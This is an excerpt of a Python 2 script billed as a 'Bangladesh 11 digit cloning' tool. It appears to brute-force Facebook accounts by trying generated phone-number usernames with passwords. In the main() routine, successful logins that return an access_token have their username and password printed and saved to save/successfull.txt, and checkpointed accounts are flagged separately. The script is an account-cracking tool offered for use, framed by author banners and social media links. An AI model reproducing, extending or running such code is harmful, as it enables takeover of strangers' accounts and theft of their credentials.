...
os.system('clear')
psb('\x1b[1;32mWEALCOME TO MD MARUF -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
...
logo = '\x1b[1;96m--------------------------------------------------\n      ---> Create to by -> MD Maruf <--- \n\x1b[1;96m-------------------------------------------------- \n\x1b[1;96m     YouTube  -> oooooo \x1b[00m\n\x1b[1;96m--------------------------------------------------\n    ---> Github -> Noobmaruf <--- \n\x1b[1;96m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;96mAUTHOR  : MD. MARUF '
    print '\x1b[1;96mFACEBOOK: https://www.facebook.com/nalzi.sk'
    print '\x1b[1;96mGITHUB  : github.com/NOOBMARUF'
    print ''
    print 50* '-'
    print '\x1b[1;92m--------------------------------------------------'
    print
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[MARUF_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[MIM_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
